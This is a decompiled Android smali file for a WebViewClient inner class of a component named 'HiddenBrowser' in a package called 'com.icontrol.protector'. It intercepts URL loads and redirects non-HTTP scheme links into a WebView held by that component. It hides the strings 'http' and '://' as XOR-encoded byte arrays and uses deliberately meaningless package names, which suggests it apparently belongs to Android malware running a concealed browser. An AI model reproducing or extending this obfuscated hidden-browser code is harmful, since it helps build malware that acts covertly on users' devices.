.class Lcom/icontrol/protector/HiddenBrowser$j;
.super Landroid/webkit/WebViewClient;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/HiddenBrowser;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "j"
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/HiddenBrowser;


# direct methods
.method private constructor <init>(Lcom/icontrol/protector/HiddenBrowser;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$j;->a:Lcom/icontrol/protector/HiddenBrowser;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/icontrol/protector/HiddenBrowser;Lcom/icontrol/protector/HiddenBrowser$a;)V
    .locals 0

    .line 2
    invoke-direct {p0, p1}, Lcom/icontrol/protector/HiddenBrowser$j;-><init>(Lcom/icontrol/protector/HiddenBrowser;)V

    return-void
.end method


# virtual methods
.method public onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
    .locals 0

    invoke-super {p0, p1, p2}, Landroid/webkit/WebViewClient;->onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$j;->a:Lcom/icontrol/protector/HiddenBrowser;

    const/4 p2, 0x1

    invoke-static {p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->h(Lcom/icontrol/protector/HiddenBrowser;Z)Z

    return-void
.end method

.method public onPageStarted(Landroid/webkit/WebView;Ljava/lang/String;Landroid/graphics/Bitmap;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/webkit/WebViewClient;->onPageStarted(Landroid/webkit/WebView;Ljava/lang/String;Landroid/graphics/Bitmap;)V

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$j;->a:Lcom/icontrol/protector/HiddenBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->h(Lcom/icontrol/protector/HiddenBrowser;Z)Z

    return-void
.end method

.method public onReceivedError(Landroid/webkit/WebView;ILjava/lang/String;Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Landroid/webkit/WebResourceRequest;)Z
    .locals 3

    const/4 p1, 0x0

    if-eqz p2, :cond_0

    invoke-interface {p2}, Landroid/webkit/WebResourceRequest;->getUrl()Landroid/net/Uri;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {p2}, Landroid/webkit/WebResourceRequest;->getUrl()Landroid/net/Uri;

    move-result-object p2

    invoke-virtual {p2}, Landroid/net/Uri;->toString()Ljava/lang/String;

    move-result-object p2

    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_0
    new-instance v0, Ljava/net/URI;

    invoke-direct {v0, p2}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/net/URI;->getHost()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/net/URI;->getPath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$j;->a:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0, p1}, Lcom/icontrol/protector/HiddenBrowser;->h(Lcom/icontrol/protector/HiddenBrowser;Z)Z

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$j;->a:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    invoke-virtual {v0, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p2

    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    return p1

    :array_0
    .array-data 1
        -0xct
        0x36t
        0x70t
        -0x2dt
    .end array-data

    :array_1
    .array-data 1
        -0x64t
        0x42t
        0x4t
        -0x5dt
        -0x3t
        0x61t
        0x54t
        -0x6et
    .end array-data

    :array_2
    .array-data 1
        0x67t
        -0x8t
        0xet
    .end array-data

    :array_3
    .array-data 1
        0x5dt
        -0x29t
        0x21t
        0x2ft
        -0x4ft
        0x78t
        0x7bt
        -0x23t
    .end array-data
.end method
